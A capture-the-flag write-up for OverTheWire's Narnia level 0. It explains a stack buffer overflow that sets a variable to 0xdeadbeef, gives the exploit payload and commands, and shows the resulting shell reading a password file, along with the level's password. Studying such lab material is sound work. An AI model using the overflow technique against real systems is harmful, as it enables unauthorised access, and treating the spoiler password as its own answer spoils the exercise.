# Narnia Level 0 → 1

## Goal

The binary reads user input into a stack buffer and, crucially, the C variable `val` sits *right above* the buffer. By writing 4 bytes past the end, you overwrite `val` with a specific magic value (`0xdeadbeef`). When `val == 0xdeadbeef`, the binary `setreuid`s to `narnia1` and spawns a shell.

## Concepts you'll learn

- What a **stack layout** looks like — local variables live next to each other, so overflowing one can clobber the next
- Little-endian byte order: `0xdeadbeef` on x86 is written as the bytes `\xef\xbe\xad\xde`
- Feeding a binary payload into a program and keeping `stdin` open so the resulting shell stays interactive

## Walkthrough

### 1. Log in and read the source

```bash
$ ssh narnia0@narnia.labs.overthewire.org -p 2226
```

Password for level 0: `narnia0`.

Binaries live in `/narnia/` with their source next to them:

```bash
$ cd /narnia
$ cat narnia0.c
```

The interesting part:

```c
int main(){
    long val;
    char buf[20];

    val = 0x41414141;
    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    scanf("%24s", &buf);

    if(val == 0xdeadbeef) {
        setreuid(geteuid(), geteuid());
        system("/bin/sh");
    } else {
        printf("WAY OFF!!!!\n");
    }
    return 0;
}
```

Three things to notice:

- `buf` is 20 bytes.
- `scanf("%24s", ...)` reads up to **24** non-whitespace characters — 4 more than `buf` can hold.
- `val` was initialised to `0x41414141` and we need it to become `0xdeadbeef`. `val` sits right after `buf` on the stack, so those last 4 bytes of our input land in `val`.

### 2. Build the payload

20 filler bytes to fill `buf`, then 4 bytes for `val` in little-endian order:

```bash
$ python3 -c 'import sys; sys.stdout.buffer.write(b"A"*20 + b"\xef\xbe\xad\xde")' > /tmp/payload
$ xxd /tmp/payload
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 efbe adde                      AAAA....
```

### 3. Fire it

```bash
$ (cat /tmp/payload; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
$ whoami
narnia1
$ cat /etc/narnia_pass/narnia1
efeidiedae
```

The trailing `cat` keeps stdin open so the newly-spawned `/bin/sh` doesn't immediately read EOF and exit.

## The answer

The password for `narnia1` is:

**`efeidiedae`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/narnia/narnia0.html>
